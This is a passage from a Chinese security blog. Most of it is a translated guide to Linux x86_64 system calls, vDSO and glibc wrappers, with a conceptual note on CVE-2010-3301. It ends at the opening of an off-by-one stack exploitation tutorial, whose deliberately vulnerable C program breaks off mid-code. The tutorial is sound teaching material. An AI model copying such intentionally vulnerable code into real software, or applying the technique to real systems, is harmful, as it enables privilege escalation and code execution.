+<p>首先，我们要找到<code>exit</code>的系统调用号。在这个例子中，我们需要从<a href="https://github.com/torvalds/linux/blob/v3.13/arch/x86/syscalls/syscall_64.tbl#L69" target="_blank" rel="external"><code>arch/x86/syscalls/syscall_64.tbl</code></a>中读取这张表：</p>
+<pre><code>60 common exit sys_exit
+</code></pre><p><code>exit</code>的系统调用号是60. 根据前文介绍，我们只需将60写入<code>eax</code>寄存器，以及第一个参数(退出状态)写入<code>rdi</code>寄存器。</p>
+<p>请看下面这段含有内联汇编的C代码。类似前面的例子，从清晰度来看，冗余的文字可能比代码本身更重要。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span></span></div><div class="line"><span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> syscall_nr = <span class="number">60</span>;</div><div class="line">  <span class="keyword">long</span> exit_status = <span class="number">42</span>;</div><div class="line"></div><div class="line">  <span class="keyword">asm</span> (<span class="string">"movq %0, %%rax\n"</span></div><div class="line">       <span class="string">"movq %1, %%rdi\n"</span></div><div class="line">       <span class="string">"syscall"</span></div><div class="line">    : <span class="comment">/* output parameters, we aren't outputting anything, no none */</span></div><div class="line">      <span class="comment">/* (none) */</span></div><div class="line">    : <span class="comment">/* input parameters mapped to %0 and %1, repsectively */</span></div><div class="line">      <span class="string">"m"</span> (syscall_nr), <span class="string">"m"</span> (exit_status)</div><div class="line">    : <span class="comment">/* registers that we are "clobbering", unneeded since we are calling exit */</span></div><div class="line">      <span class="string">"rax"</span>, <span class="string">"rdi"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>接下来，编译，执行，然后检查退出状态:</p>
+<pre><code>$ gcc -o test test.c
+$ ./test
+$ echo $?
+42
+</code></pre><p>成功了! 我们利用<code>syscall</code>系统调用方式来触发<code>exit</code>系统调用。避免了软件中断，如果我们要用micro-benchmark 来计算时间的话，这种方法执行起来要快许多。</p>
+<h3 id="内核层面：syscall入口"><a href="#内核层面：syscall入口" class="headerlink" title="内核层面：syscall入口"></a>内核层面：syscall入口</h3><p>现在我们已经知道了如何从用户程序中触发系统调用。接下来就要介绍内核如何利用系统调用号执行系统调用中的代码。</p>
+<p>回想前文，我们知道如何将<code>system_call</code>函数的地址写入<code>LSTAR</code> MSR中。</p>
+<p>下面就来看看这个函数中的代码是如何利用<code>rax</code>寄存器将执行环境切换到系统调用中的。可以参考<a href="https://github.com/torvalds/linux/blob/v3.13/arch/x86/kernel/entry_64.S#L629" target="_blank" rel="external"><code>arch/x86/kernel/entry_64.S</code></a>:</p>
+<pre><code>call *sys_call_table(,%rax,8)  # XXX:    rip relative
+</code></pre><p>类似传统系统调用，<code>sys_call_table</code>一张在C文件中定义的表，其利用<code>#include</code>将脚本产生的C代码包含进来。</p>
+<p>在<a href="https://github.com/torvalds/linux/blob/v3.13/arch/x86/kernel/syscall_64.c#L25-L32" target="_blank" rel="external"><code>arch/x86/kernel/syscall_64.c</code></a>,注意底部的<code>#include</code>:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">asmlinkage <span class="keyword">const</span> <span class="keyword">sys_call_ptr_t</span> sys_call_table[__NR_syscall_max+<span class="number">1</span>] = &#123;</div><div class="line">        <span class="comment">/*</span></div><div class="line">         * Smells like a compiler bug -- it doesn't work</div><div class="line">         * when the &amp; below is removed.</div><div class="line">         */</div><div class="line">        [<span class="number">0</span> ... __NR_syscall_max] = &amp;sys_ni_syscall,</div><div class="line">#include &lt;<span class="keyword">asm</span>/syscalls_64.h&gt;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
+<p>从前文我们知道，系统调用表定义在<a href="https://github.com/torvalds/linux/blob/v3.13/arch/x86/syscalls/syscall_64.tbl" target="_blank" rel="external"><code>arch/x86/syscalls/syscall_64.tbl</code></a>。与传统中断模式一样，脚本在内核编译的时候执行并通过<code>syscall_64.tbl</code>文件中的表生成<code>syscalls_64.h</code>文件。</p>
+<p>上述代码包括能生成系统调用号索引的函数指针数组的C代码。</p>
+<p>以上就是如何通过<code>syscall</code>系统调用进入内核的全过程。</p>
+<h3 id="sysret-从syscall中返回"><a href="#sysret-从syscall中返回" class="headerlink" title="sysret: 从syscall中返回"></a>sysret: 从syscall中返回</h3><p>内核利用<code>sysret</code>指令将执行环境恢复到用户程序执行<code>syscall</code>的地方。</p>
+<p><code>sysret</code>比起<code>sysexit</code>来要简单一些，因为当执行<code>syscall</code>时，需要被恢复执行的地址保存在<code>rcx</code>寄存器中。</p>
+<p>只要能将这个地址保存起来，并在执行<code>sysret</code>前将其恢复到<code>rcx</code>寄存器中，执行环境就能在触发<code>syscall</code>的地方恢复。</p>
+<p>这种机制比较方便，因为<code>sysenter</code>却要求你自己在代码中计算这个地址，并将其重写到寄存器中。</p>
+<p>上述代码在<a href="https://github.com/torvalds/linux/blob/v3.13/arch/x86/kernel/entry_64.S#L650-L655" target="_blank" rel="external"><code>arch/x86/kernel/entry_64.S</code></a>:</p>
+<pre><code>movq RIP-ARGOFFSET(%rsp),%rcx
+CFI_REGISTER    rip,rcx
+RESTORE_ARGS 1,-ARG_SKIP,0
+/*CFI_REGISTER  rflags,r11*/
+movq    PER_CPU_VAR(old_rsp), %rsp
+USERGS_SYSRET64
+</code></pre><p>其中<code>USERGS_SYSRET64</code>是定义在<a href="https://github.com/torvalds/linux/blob/v3.13/arch/x86/include/asm/irqflags.h#L133-L135" target="_blank" rel="external"><code>arch/x86/include/asm/irqflags.h</code></a>中的宏，其中包含<code>sysret</code>指令。</p>
+<p>好了，目前为止，你已经知道64位系统调用是如何工作的了。</p>
+<h2 id="syscall-2-半手动调用syscall"><a href="#syscall-2-半手动调用syscall" class="headerlink" title="syscall(2)半手动调用syscall"></a>syscall(2)半手动调用syscall</h2><p>太棒了，针对不同系统调用模型，我们已经知道如何编写汇编代码去触发这些系统调用了。</p>
+<p>通常来说，你没必要自己写汇编代码。glibc提供的封装器函数已经为你处理好了所有的汇编代码。</p>
+<p>当然，也有一些系统调用，glibc并没有为其做好封装器。其中一个例子就是<code>futex</code>–快速用户层上锁系统调用。</p>
+<p>等等，为什么<a href="http://man7.org/linux/man-pages/man7/futex.7.html#NOTES" target="_blank" rel="external"><code>futex</code></a>没有系统调用封装器呢？</p>
+<p><code>futex</code>是为库函数调用准备的，而不是应用程序。因此，要想调用<code>futex</code>，你必须这样做:</p>
+<ol>
+<li>为你想支持的平台生成汇编存根(stub)</li>
+<li>使用glibc提供的<code>syscall</code>封装器</li>
+</ol>
+<p>有些时候，如果你想执行那些没有封装器的系统调用，你别无选择，只能利用第二种方法：使用glibc提供的<code>syscall</code>函数。</p>
+<p>我们试试利用glibc提供的<code>syscall</code>调用<code>exit</code>，其退出状态是42:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span></span></div><div class="line"><span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> syscall_nr = <span class="number">60</span>;</div><div class="line">  <span class="keyword">long</span> exit_status = <span class="number">42</span>;</div><div class="line"></div><div class="line">  syscall(syscall_nr, exit_status);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>接下来，编译，执行，然后检查退出状态:</p>
+<pre><code>$ gcc -o test test.c
+$ ./test
+$ echo $?
+42
+</code></pre><p>成功了！我们利用glibc提供的<code>syscall</code>封装器成功的调用了<code>exit</code>.</p>
+<h2 id="glibc-syscall封装器内幕"><a href="#glibc-syscall封装器内幕" class="headerlink" title="glibc syscall封装器内幕"></a>glibc syscall封装器内幕</h2><p>来看看前面例子中<code>syscall</code>封装器在glibc中是如何工作的</p>
+<p>在<a href="https://github.molgen.mpg.de/git-mirror/glibc/blob/glibc-2.15/sysdeps/unix/sysv/linux/x86_64/syscall.S#L24-L42" target="_blank" rel="external"><code>sysdeps/unix/sysv/linux/x86_64/syscall.S</code></a>：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">/* Usage: long syscall (syscall_number, arg1, arg2, arg3, arg4, arg5, arg6)</div><div class="line">   We need to do some arg shifting, the syscall_number will be in</div><div class="line">   rax.  */</div><div class="line"></div><div class="line"></div><div class="line">        .text</div><div class="line">ENTRY (syscall)</div><div class="line">        movq %rdi, %rax         /* Syscall number -&gt; rax.  */</div><div class="line">        movq %rsi, %rdi         /* shift arg1 - arg5.  */</div><div class="line">        movq %rdx, %rsi</div><div class="line">        movq %rcx, %rdx</div><div class="line">        movq %r8, %r10</div><div class="line">        movq %r9, %r8</div><div class="line">        movq 8(%rsp),%r9        /* arg6 is on the stack.  */</div><div class="line">        syscall                 /* Do the system call.  */</div><div class="line">        cmpq $-4095, %rax       /* Check %rax for error.  */</div><div class="line">        jae SYSCALL_ERROR_LABEL /* Jump to error handler if error.  */</div><div class="line">L(pseudo_end):</div><div class="line">        ret                     /* Return to caller.  */</div></pre></td></tr></table></figure>
+<p>前面我们给出了x86_64 ABI文档的参考链接，其描述了用户层和内核层的调用规范。</p>
+<p>这段汇编stud很酷，因为它同时遵守两种调用规范。传递到这个函数的参数遵守用户层调用规范，但是在转移到另一组不同的寄存器利用<code>syscall</code>进入内核之前，又遵守内核层规范。</p>
+<p>以上就是在你要执行默认没有封装器的系统调用时，glibc提供的<code>syscall</code>封装器的工作方式。</p>
+<h2 id="虚拟系统调用"><a href="#虚拟系统调用" class="headerlink" title="虚拟系统调用"></a>虚拟系统调用</h2><p>到目前为止，我们已经介绍了所有进入内核触发系统调用的方法，并演示了如何手动(或者半手动）触发系统调用将系统从用户层切换到内核层。</p>
+<p>倘若程序能触发一些系统调用，而不需要进入到内核呢？</p>
+<p>这就是Linux vDSO存在的原因。Linux vDSO是内核代码的一部分，但是却被映射到用户程序地址空间中在用户层执行。</p>
+<p>这也就是一些系统调用不用进入到内核就能被执行的原因。举个这样的例子: <code>gettimeofday</code>系统调用。</p>
+<p>程序调用<code>gettimeofday</code>并不会真正进入到内核。而是简单的调用了内核提供的一小段代码，然后在用户层执行。</p>
+<p>没有软件中断，也不需要复杂的<code>sysenter</code>或者<code>syscall</code>的记录工作。<code>gettimeofday</code>只是一个普通的函数调用。</p>
+<p>当你执行<code>ldd</code>命令时，可以看到vDSO出现在第一个条目中：</p>
+<pre><code>$ ldd `which bash`
+ linux-vdso.so.1 =&gt;  (0x00007fff667ff000)
+ libtinfo.so.5 =&gt; /lib/x86_64-linux-gnu/libtinfo.so.5 (0x00007f623df7d000)
+  libdl.so.2 =&gt; /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f623dd79000)
+  libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f623d9ba000)
+  /lib64/ld-linux-x86-64.so.2 (0x00007f623e1ae000)
+</code></pre><p>下面来看看vDSO在内核中是如何设置的。</p>
+<h2 id="内核中的vDSO"><a href="#内核中的vDSO" class="headerlink" title="内核中的vDSO"></a>内核中的vDSO</h2><p>可以在 <a href="https://github.com/torvalds/linux/tree/v3.13/arch/x86/vdso" target="_blank" rel="external"><code>arch/x86/vdso/</code></a>中找到vDSO的源码。 其中包括一小段汇编代码、一些C源文件和一个链接器脚本</p>
+<p>此<a href="https://sourceware.org/binutils/docs/ld/Scripts.html" target="_blank" rel="external">链接器脚本</a>是个很酷的东西，可以具体去了解一下。</p>
+<p>看看<a href="https://github.com/torvalds/linux/blob/v3.13/arch/x86/vdso/vdso.lds.S" target="_blank" rel="external"><code>arch/x86/vdso/vdso.lds.S</code></a>:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="comment">/*</span></div><div class="line"> * This controls what userland symbols we export from the vDSO.</div><div class="line"> */</div><div class="line">VERSION &#123;</div><div class="line">        LINUX_2<span class="number">.6</span> &#123;</div><div class="line">        global:</div><div class="line">                clock_gettime;</div><div class="line">                __vdso_clock_gettime;</div><div class="line">                gettimeofday;</div><div class="line">                __vdso_gettimeofday;</div><div class="line">                getcpu;</div><div class="line">                __vdso_getcpu;</div><div class="line">                time;</div><div class="line">                __vdso_time;</div><div class="line">        local: *;</div><div class="line">        &#125;;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>链接器脚本很有用处，但并不被大家所熟知。链接器脚本会处理vDSO要导出的符号表。</p>
+<p>可以看到，vDSO导出了4个不同的函数，每个函数都有两个名字。<br>可以在此文件夹下的C文件中找到函数的定义。</p>
+<p>例如，<code>gettimeofday</code>的源代码可以在<a href="https://github.com/torvalds/linux/blob/v3.13/arch/x86/vdso/vclock_gettime.c#L281-L282" target="_blank" rel="external"><code>arch/x86/vdso/vclock_gettime.c</code></a>中找到:</p>
+<pre><code>int gettimeofday(struct timeval *, struct timezone *)
+    __attribute__((weak, alias(&quot;__vdso_gettimeofday&quot;)));
+</code></pre><p>这段代码将<code>gettimeofday</code>作为<code>__vdso_gettimeofday</code> 的弱别名(<a href="https://gcc.gnu.org/onlinedocs/gcc-4.3.5/gcc/Function-Attributes.html" target="_blank" rel="external">weak alias</a>)。</p>
+<p><a href="https://github.com/torvalds/linux/blob/v3.13/arch/x86/vdso/vclock_gettime.c#L260-L280" target="_blank" rel="external">同文件</a>中的<code>__vdso_gettimeofday</code>函数中包含了当用户程序执行<code>gettimeofday</code>系统调用时真正在用户层执行的源代码。</p>
+<h2 id="在内存中定为vDSO"><a href="#在内存中定为vDSO" class="headerlink" title="在内存中定为vDSO"></a>在内存中定为vDSO</h2><p>由于地址空间布局随机化(<a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization" target="_blank" rel="external">ASLR</a>)的原因,当程序开始执行时，vDSO会被加载到随机的地址空间中。</p>
+<p>如果vDSO加载到随机地址空间中，用户程序是如何找到它的呢？</p>
+<p>回想前文提到的<code>sysenter</code>系统调用方法，用户程序要调用<code>_ _kernel_vsyscall</code>函数，而不是自己写<code>sysenter</code>汇编代码。</p>
+<p>而<code>_ _kernel_vsyscall</code>函数也是vDSO的一部分。</p>
+<p>提供的代码样例中通过搜索<a href="https://www.gnu.org/software/libc/manual/html_node/Auxiliary-Vector.html" target="_blank" rel="external">ELF辅助头文件</a>找到和<code>AT_SYSINFO</code>匹配的头文件，头文件中含有<code>_ _kernel_vsyscall</code>函数的地址。</p>
+<p>类似的，要定位到vDSO, 用户程序可以搜索ELF辅助头文件找到和<code>AT_SYSINFO_EHDR</code>匹配的头文件. 里面包含由链接器脚本生成的vDSO的ELF头的起始地址。</p>
+<p>两个例子中，程序被加载时内核都会将其地址写入到ELF头中。这也就是为何正确的地址总是出现<code>AT_SYSINFO_EHDR</code>和<code>AT_SYSINFO</code>中。</p>
+<p>一旦定为到ELF头部信息，用户程序就能解析ELF对象了(可以用<a href="http://www.mr511.de/software/english.html" target="_blank" rel="external">libelf</a>),并且可以根据需要调用ELF对象中的函数。</p>
+<p>这样很酷，因为这就意味着vDSO能充分利用ELF有用的特性，比如<a href="https://www.akkadia.org/drepper/symbol-versioning" target="_blank" rel="external"> symbol versioning</a>。</p>
+<p>内核文档 <a href="https://github.com/torvalds/linux/tree/v3.13/Documentation/vDSO" target="_blank" rel="external"><code>Documentation/vDSO/</code></a>中有解析vDSO和调用其中函数的例子。</p>
+<h2 id="glibc中的vDSO"><a href="#glibc中的vDSO" class="headerlink" title="glibc中的vDSO"></a>glibc中的vDSO</h2><p>大多数情况下，大家都会访问vDSO，但并不会意识到。那是因为glibc利用前面章节介绍的接口对其进行了封装抽象。</p>
+<p>当一个程序被加载时，<a href="http://man7.org/linux/man-pages/man8/ld.so.8.html" target="_blank" rel="external">动态链接器和加载器</a>便会加载程序依赖的DSOs，也包括vDSO.</p>
+<p>当glibc解析被加载程序的ELF头部时，会存储有关于vDSO的一些位置信息。也包括简短的stub函数，用来在真正执行系统调用前搜索vDSO中的符号名。</p>
+<p>举个例子，<code>glibc</code>中的<code>gettimeofday</code>函数，定义在<a href="https://github.molgen.mpg.de/git-mirror/glibc/blob/glibc-2.15/sysdeps/unix/sysv/linux/x86_64/gettimeofday.c#L26-L37" target="_blank" rel="external"><code>sysdeps/unix/sysv/linux/x86_64/gettimeofday.c</code></a>中：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> *<span class="title">gettimeofday_ifunc</span> <span class="params">(<span class="keyword">void</span>)</span> __<span class="title">asm__</span> <span class="params">(<span class="string">"__gettimeofday"</span>)</span></span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> *</span></div><div class="line"><span class="title">gettimeofday_ifunc</span> <span class="params">(<span class="keyword">void</span>)</span></div><div class="line">&#123;</div><div class="line">  PREPARE_VERSION (linux26, <span class="string">"LINUX_2.6"</span>, <span class="number">61765110</span>);</div><div class="line"></div><div class="line">  <span class="comment">/* If the vDSO is not available we fall back on the old vsyscall.  */</span></div><div class="line">  <span class="keyword">return</span> (_dl_vdso_vsym (<span class="string">"gettimeofday"</span>, &amp;linux26)</div><div class="line">          ?: (<span class="keyword">void</span> *) VSYSCALL_ADDR_vgettimeofday);</div><div class="line">&#125;</div><div class="line">__asm (<span class="string">".type __gettimeofday, %gnu_indirect_function"</span>);</div></pre></td></tr></table></figure>
+<p>这段glibc中的代码会在vDSO中搜索<code>gettimeofday</code>函数并且返回其地址。这些工作都通过 <a href="http://willnewton.name/uncategorized/using-gnu-indirect-functions/" target="_blank" rel="external">间接函数</a>封装好了。</p>
+<p>这就是程序如何通过glibc调用<code>gettimeofday</code>并访问vDSO却完全不用切换到内核、引发特权级转变以及触发软件中断的全过程。</p>
+<p>其中也总结了Linux 32/64位 Intel/AMD系统的每种系统调用方法的优势。</p>
+<h2 id="glibc-系统调用封装器"><a href="#glibc-系统调用封装器" class="headerlink" title="glibc 系统调用封装器"></a>glibc 系统调用封装器</h2><p>在讨论系统调用的时候，简单的提提glibc是如何处理系统调用是很有意义的。</p>
+<p>对于许多系统调用来说，glibc只需要一个简单的封装函数将参数传入合适的寄存器中，然后执行<code>syscall</code>或者<code>int $0x80</code>指令，或者调用<code>_ _kernel_vsyscall</code>。</p>
+<p>这些都是利用一系列在文本文件中定义的表完成的，这些表会经过脚本处理并输出C代码。</p>
+<p>例如，<a href="https://github.molgen.mpg.de/git-mirror/glibc/blob/glibc-2.15/sysdeps/unix/syscalls.list" target="_blank" rel="external">`sysdeps/unix/syscalls.list</a> `文件描述了一些常用的系统调用:</p>
+<pre><code>access - access i:si __access access acct - acct i:S acct chdir - chdir i:s __chdir chdir chmod - chmod i:si __chmod chmod
+</code></pre><p>要了解每一栏目的含义，可以查看处理此文件的脚本注释： <a href="https://github.molgen.mpg.de/git-mirror/glibc/blob/glibc-2.15/sysdeps/unix/make-syscalls.sh" target="_blank" rel="external"><code>sysdeps/unix/make-syscalls.sh</code></a>.</p>
+<p>对于更复杂的系统调用，比如<code>exit</code>，其会触发那些有真正C代码或汇编代码实现的处理函数，并不会出现在类似这样的文本文件中。</p>
+<p>以后的博文中会具体介绍glibc的实现以及linux内核中一些重要的系统调用。</p>
+<h2 id="重要的syscall相关bugs"><a href="#重要的syscall相关bugs" class="headerlink" title="重要的syscall相关bugs"></a>重要的syscall相关bugs</h2><p>很荣幸能利用这次机会提两个与linux系统调用相关的神奇bugs.</p>
+<p>一起来瞧一瞧吧！</p>
+<h3 id="CVE-2010-3301"><a href="#CVE-2010-3301" class="headerlink" title="CVE-2010-3301"></a>CVE-2010-3301</h3><p><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=2010-3301" target="_blank" rel="external">这个安全利用</a>能让本地用户获取root权限。</p>
+<p>引起这个漏洞的原因就在于汇编代码中的一个小bug，其允许用户程序触发x86_64系统中的传统系统调用。</p>
+<p>此利用代码相当聪明:在一个特定的地址下，利用<code>mmap</code>生成一块内存区域，并利用一个整数让代码产生溢出：</p>
+<p>（还记得上面章节中提到的传统中断方式中的这段代码吗？）</p>
+<pre><code>call *ia32_sys_call_table(,%rax,8)
+</code></pre><p>此代码可以将执行环境切换到一块任意的地址中，在那执行内核代码，从而可以将运行的进程权限提升到root.</p>
+<h2 id="Android-sysenter-ABI-破坏"><a href="#Android-sysenter-ABI-破坏" class="headerlink" title="Android sysenter ABI 破坏"></a>Android <code>sysenter</code> ABI 破坏</h2><p>还记得前面说过不要在应用程序代码中硬编码<code>sysenter</code> ABI吗？</p>
+<p>不幸的是，用android-x86的一些人就容易犯这些错误。只要内核的ABI一改变，andorid-x86就瞬间无法工作。</p>
+<p>工作于内核的人最终用一些陈旧的<code>sysenter</code>硬编码序列来恢复<code>sysenter</code> ABI,以避免对Android设备的破坏。</p>
+<p><a href="http://git.kernel.org/cgit/linux/kernel/git/tip/tip.git/commit/?id=30bfa7b3488bfb1bb75c9f50a5fcac1832970c60" target="_blank" rel="external">这里</a>是提交给Linux 内核的patch. 你也可以在提交信息中找到向android源码提交的攻击代码的链接</p>
+<p>记住：千万不要自己编写汇编代码使用<code>sysenter</code>. 如果你因为某种原因要自己实现，可以使用前面例子中的一些代码，起码要仔细检查一下 <code>__kernel_vsyscall</code>函数。</p>
+<h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>Linux内核中的系统调用机制是及其复杂的。触发系统调用有许多中方案，各都有其优缺点。</p>
+<p>自己编写汇编代码来触发系统调用可不是个好主意，因为在你代码下层的ABI可能会崩溃。系统中的内核以及libc的实现会（可能会）选择最快的方式来触发系统调用。</p>
+<p>如果你不能使用glibc提供的封装器(或者那个封装器不存在),你起码应该用<code>syscall</code>封装器函数，或者仔细检查vDSO提供的<code>_ _kernel_vsyscall</code>.</p>
+<p>继续关注将来研究单个系统调用及其实现的相关文章。</p>
+<h2 id="相关文章"><a href="#相关文章" class="headerlink" title="相关文章"></a>相关文章</h2><p>如果你喜欢这篇博客，你可能对以下底层技术的相关博客也感兴趣。</p>
+<p><a href="http://blog.packagecloud.io/eng/2016/02/29/how-does-strace-work/" target="_blank" rel="external">How does strace work?</a></p>
+<p><a href="http://blog.packagecloud.io/eng/2016/03/14/how-does-ltrace-work/" target="_blank" rel="external">How does ltrace work?</a></p>
+<p><a href="http://blog.packagecloud.io/eng/2016/03/21/apt-hash-sum-mismatch/" target="_blank" rel="external">APT Hash sum mismatch</a></p>
+<p><a href="http://blog.packagecloud.io/eng/2014/10/28/howto-gpg-sign-verify-deb-packages-apt-repositories/" target="_blank" rel="external">HOWTO: GPG sign and verify deb packages and APT repositories</a></p>
+<p><a href="http://blog.packagecloud.io/eng/2014/11/24/howto-gpg-sign-verify-rpm-packages-yum-repositories/" target="_blank" rel="external">HOWTO: GPG sign and verify RPM packages and yum repositories</a></p>
+<hr>
+<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20161231/systemcallinternal/" target="_blank" rel="external">Linux系统调用权威指南</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
+
+      
+    </div>
+    <footer class="entry-meta entry-footer">
+      
+	<span class="ico-folder"></span>
+    <a class="article-category-link" href="/categories/系统内核/">系统内核<span class="article-category-count">7</span></a>
+
+
+      
+  <span class="ico-tags"></span>
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Kernel/">Kernel</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/">Linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/System/">System</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Systemcall/">Systemcall</a></li></ul>
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+<!-- Table of Contents -->
+
+  
+    <article id="post-stackoffbyone"  class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" itemprop="name">
+      <a class="article-title" href="/20161231/stackoffbyone/">栈内off-by-one漏洞利用</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	Posted on <a href="/20161231/stackoffbyone/" class="article-date">
+	  <time datetime="2016-12-31T06:38:26.000Z" itemprop="datePublished">十二月 31, 2016</time>
+	</a>
+
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>作者: <a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
+<hr>
+<p><strong>CSysSec注</strong>： 本系列文章译自安全自由工作者<a href="https://sploitfun.wordpress.com/about-2/" target="_blank" rel="external">Sploitfun</a>的漏洞利用系列博客，从经典栈缓冲区漏洞利用堆漏洞利用，循序渐进，是初学者不可多得的好材料，本系列所有文章涉及的源码可以在<a href="https://github.com/sploitfun/lsploits" target="_blank" rel="external">这里</a>找到。CSysSec计划在原基础上不断添加相关漏洞利用技术以及相应的Mitigation方法，欢迎推荐或自荐文章。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20161231/stackoffbyone/" target="_blank" rel="external">Linux(X86)漏洞利用系列-栈内Off-by-one漏洞利用</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
+<hr>
+<blockquote>
+<ul>
+<li>0X01 什么是off-by-one漏洞</li>
+<li>0X02 如何实现任意代码执行</li>
+<li>0X03 如果调用者的EBP不在目标缓冲区正上方，该怎么办</li>
+<li>0X04 什么情况下调用者的EBP不在目标缓冲区正上方</li>
+</ul>
+</blockquote>
+<p><u><em>阅读基础:</em></u></p>
+<ol>
+<li><a href="http://www.csyssec.org/20161231/stackbufferflow/" target="_blank" rel="external">经典栈缓冲区溢出</a></li>
+</ol>
+<p><u><em>VM Setup:</em></u> Ubuntu 12.04 (x86)</p>
+<h3 id="0X01-什么是off-by-one漏洞？"><a href="#0X01-什么是off-by-one漏洞？" class="headerlink" title="0X01 什么是off-by-one漏洞？"></a>0X01 什么是off-by-one漏洞？</h3><p>将源缓冲区复制到目标缓冲区时，以下情况可能导致Off-By-One漏洞：</p>
+<pre><code>源字符串长度等于目标缓冲区长度
+</code></pre><p>当源字符串长度等于目标缓冲区长度时，单个NULL字节就会被复制到目标缓冲区上方。这种情况下，由于目标缓冲区存储在栈内，因此，仅凭单个NULL字节就能把栈内调用者EBP的最低有效位(LSB)覆盖掉。</p>
+<p>依照惯例，未免定义过于枯燥，下面我们就来看一则Off-By-One漏洞代码。</p>
+<p><u><em>漏洞代码：</em></u></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//vuln.c</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">char</span>* arg)</span></span>;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">bar</span><span class="params">(<span class="keyword">char</span>* arg)</span></span>;</div><div class="line"></div><div class="line"><span class="function"><span 